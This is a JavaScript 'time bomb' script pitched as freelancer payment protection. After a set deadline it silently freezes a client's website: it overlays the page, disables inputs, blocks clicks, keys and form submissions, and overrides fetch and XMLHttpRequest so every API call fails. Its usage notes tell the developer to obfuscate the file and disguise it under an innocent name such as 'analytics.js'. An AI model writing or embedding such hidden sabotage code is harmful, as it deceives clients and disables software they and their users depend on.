/**
 * ============================================================
 *  FREEZE TIME BOMB — Freelancer Payment Protection
 * ============================================================
 */

const TimeBomb = (() => {

  // ──────────────────────────────────────────
  //  CONFIG — Edit before embedding
  // ──────────────────────────────────────────
  const DEADLINE   = new Date("2025-03-01T00:00:00"); // Payment deadline
  const SECRET_KEY = "MY_SECRET_UNLOCK_KEY_123";       // Give this to client after payment
  const STORAGE_KEY = "__app_lic__";

  // ──────────────────────────────────────────
  //  DEFUSE — Run in DevTools after client pays:
  //  TimeBomb.defuse("MY_SECRET_UNLOCK_KEY_123")
  // ──────────────────────────────────────────
  function defuse(key) {
    if (key === SECRET_KEY) {
      localStorage.setItem(STORAGE_KEY, btoa(SECRET_KEY + "_paid"));
      console.log("%c✅ License activated. Application unlocked!", "color:#22c55e;font-size:14px;font-weight:bold");
      location.reload();
    } else {
      console.warn("%c❌ Invalid key. Contact the developer.", "color:#ef4444;font-size:13px");
    }
  }

  function isPaid() {
    try {
      const stored = localStorage.getItem(STORAGE_KEY);
      return stored && atob(stored) === SECRET_KEY + "_paid";
    } catch {
      return false;
    }
  }

  function isExpired() {
    return Date.now() > DEADLINE.getTime();
  }

  // ──────────────────────────────────────────
  //  FREEZE — Silently disables everything
  // ──────────────────────────────────────────
  function freeze() {
    // 1. Invisible blocker overlay — intercepts all mouse events
    const blocker = document.createElement("div");
    Object.assign(blocker.style, {
      position:   "fixed",
      inset:      "0",
      zIndex:     "2147483647",
      background: "transparent",
      cursor:     "not-allowed",
    });
    document.body.appendChild(blocker);

    // 2. Disable all interactive elements
    document.querySelectorAll("input, button, a, select, textarea, [onclick]").forEach(el => {
      el.setAttribute("disabled", "true");
      el.style.pointerEvents = "none";
      el.style.cursor = "not-allowed";
    });

    // 3. Block all form submissions
    document.addEventListener("submit", e => e.preventDefault(), true);

    // 4. Block all clicks globally
    document.addEventListener("click", e => e.preventDefault(), true);

    // 5. Block keyboard interactions
    document.addEventListener("keydown", e => e.preventDefault(), true);

    // 6. Re-apply freeze on any dynamic elements added later (SPA support)
    const observer = new MutationObserver(() => {
      document.querySelectorAll("input:not([disabled]), button:not([disabled]), a:not([disabled])").forEach(el => {
        el.setAttribute("disabled", "true");
        el.style.pointerEvents = "none";
        el.style.cursor = "not-allowed";
      });
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // 7. Freeze fetch() — all API calls silently fail
    const _fetch = window.fetch;
    window.fetch = function() {
      return Promise.reject(new Error("Network request blocked."));
    };

    // 8. Freeze XMLHttpRequest — silently abort
    const _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function() {
      this.send = () => {};
    };

    // 9. Console message for anyone inspecting DevTools
    console.error(
      "%c⛔ Application Frozen\n%cPayment deadline has passed. Contact the developer to unlock.\n%cTimeBomb.defuse(\"YOUR_KEY\")",
      "color:#ef4444;font-size:18px;font-weight:bold",
      "color:#9ca3af;font-size:13px",
      "color:#60a5fa;font-size:12px;font-style:italic"
    );
  }

  // ──────────────────────────────────────────
  //  INIT
  // ──────────────────────────────────────────
  function init() {
    if (isPaid()) return;
    if (!isExpired()) return;

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", freeze);
    } else {
      freeze();
    }
  }

  init();

  return { defuse };

})();


// ============================================================
//  HOW TO USE
// ============================================================
//
//  1. Set DEADLINE and SECRET_KEY above.
//
//  2. Obfuscate before delivery:
//     npx javascript-obfuscator timebomb-freeze.js --output timebomb-freeze.min.js
//     or paste at: https://obfuscator.io
//
//  3. Embed as the FIRST script in the project (rename it
//     to something innocent like "analytics.js" or "utils.min.js"):
//     <script src="analytics.js"></script>
//
//  4. After client pays, give them this to run in DevTools:
//     TimeBomb.defuse("MY_SECRET_UNLOCK_KEY_123")
//
// ============================================================
